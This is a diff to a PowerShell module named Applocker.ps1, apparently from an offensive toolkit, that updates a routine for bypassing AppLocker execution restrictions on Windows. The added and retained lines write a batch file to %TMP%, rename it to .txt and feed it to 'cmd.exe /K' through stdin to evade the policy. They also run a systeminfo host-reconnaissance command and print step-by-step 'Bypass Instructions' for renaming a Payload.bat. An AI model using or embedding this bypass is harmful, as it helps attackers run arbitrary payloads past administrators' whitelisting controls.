@@ -9,7 +9,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.5
+   PS cmdlet Dev version: v1.2.6
 
 .DESCRIPTION
    Applocker.ps1 module searchs in pre-defined directorys in %WINDIR%
@@ -188,6 +188,15 @@ If($TestBat -ieq "TestBypass"){
       [i] converting applock.bat to applock.txt
       [i] trying to execute applock.txt text file
       [+] success: execution restriction bypassed!
+      [+] script output:
+
+      Host Name:                 SKYNET
+      OS Name:                   Microsoft Windows 10 Home
+      OS Version:                10.0.18363 N/A Build 18363
+      OS Manufacturer:           Microsoft Corporation
+      OS Configuration:          Standalone Workstation
+      OS Build Type:             Multiprocessor Free
+      System Type:               x64-based PC
 
       [powershell] Bypass Instructions
       --------------------------------
@@ -201,7 +210,7 @@ If($TestBat -ieq "TestBypass"){
    Write-Host "[i] writting applock.bat to %tmp% folder";Start-Sleep -Seconds 1
 
    echo "@echo off"|Out-File $Env:TMP\applock.bat -encoding ascii -force
-   echo "date /T > %tmp%\logfile.txt"|Add-Content $Env:TMP\applock.bat -encoding ascii
+   echo "systeminfo|findstr `"Host OS Type`"|findstr /V `"BIOS`" > %tmp%\logfile.txt"|Add-Content $Env:TMP\applock.bat -encoding ascii
 
    Write-Host "[i] trying to execute applock.bat script"
    Start-Sleep -Seconds 1;&"$Env:TMP\applock.bat"
@@ -222,7 +231,7 @@ If($TestBat -ieq "TestBypass"){
 
       Write-Host "[i] trying to execute applock.txt text file`n"
       ## Nice trick to be abble to execute cmd stdin { < } on PS
-      Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe < %tmp%\applock.txt"
+      Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < %tmp%\applock.txt"
 
       Clear-Host
       If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){
@@ -250,7 +259,9 @@ If($TestBat -ieq "TestBypass"){
          Write-Host "[i] converting applock.bat to applock.txt"
          Write-Host "[i] trying to execute applock.txt text file";Start-Sleep -Seconds 2
          Write-Host "[+] success: execution restriction bypassed!" -ForegroundColor Green
+         Write-Host "[+] script output:`n"
          Start-Sleep -Seconds 1
+         Get-Content -Path "$Env:TMP\logfile.txt"
          Write-Host "`n[powershell] Bypass Instructions" -ForegroundColor Green
          Write-Host "--------------------------------"
          Write-Host "Move-Item -Path `"Payload.bat`" -Destination `"Payload.txt`" -Force"
@@ -266,7 +277,9 @@ If($TestBat -ieq "TestBypass"){
       Write-Host "--------------------------------------------------"
       Write-Host "[i] writting applock.bat to %tmp% folder"
       Write-Host "[i] trying to execute applock.bat script"
-      Write-Host "[+] success: executed! none restrictions found!`n" -ForeGroundColor Green
+      Write-Host "[+] success: executed! none restrictions found!" -ForeGroundColor Green
+      Write-Host "[+] script output:`n"
+      Get-Content -Path "$Env:TMP\logfile.txt"
    }
 
    ## Delete ALL artifacts left behind
